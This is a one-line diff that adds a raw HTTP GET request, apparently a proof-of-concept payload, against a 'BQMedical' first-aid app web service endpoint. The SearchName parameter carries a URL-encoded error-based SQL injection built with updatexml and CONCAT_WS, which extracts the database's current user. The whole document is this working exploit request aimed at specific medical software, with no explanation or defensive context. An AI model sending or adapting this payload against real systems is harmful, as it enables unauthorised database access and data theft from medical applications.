@@ -1,0 +1,1 @@
+GET /AppService/BQMedical/WebServiceForFirstaidApp.asmx/GetMonitorList?UserID=1&OperatorID=1&SearchName=string%27%26%26+updatexml(1,CONCAT_WS(1,1,current_user),1)+%26%26%27 HTTP/1.1
